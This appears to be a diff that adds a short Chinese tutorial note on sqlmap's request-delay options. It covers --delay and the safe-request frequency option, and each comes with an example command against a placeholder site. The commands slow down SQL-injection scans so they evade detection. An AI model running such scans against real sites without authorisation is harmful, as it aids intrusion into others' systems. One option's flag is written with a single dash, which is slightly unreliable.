@@ -1,0 +1,23 @@
+
+
+               			    SQLMAP渗透笔记之请求延时
+
+
+                                           作者：拿破飞机
+
+---------------------------------------------------------------------------------------------
+
+参数一：--delay 1(1秒)   表示延时1秒进行注入，1可根据自己情况更改
+
+sqlmap.py -u "http://www.xx.com/index.php/index/view/id/40*.html" --delay 1(1是时间，1秒，自己设置)
+
+例：
+sqlmap.py -u "http://www.xx.com/index.php/index/view/id/40*.html" --delay 1
+
+
+参数二：-safe-freq   提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。
+
+sqlmap.py -u "http://www.xx.com/index.php/index/view/id/40*.html" -safe-freq 20(20为次数，自己设定)
+
+例：
+sqlmap.py -u "http://www.xx.com/index.php/index/view/id/40*.html" -safe-freq 3
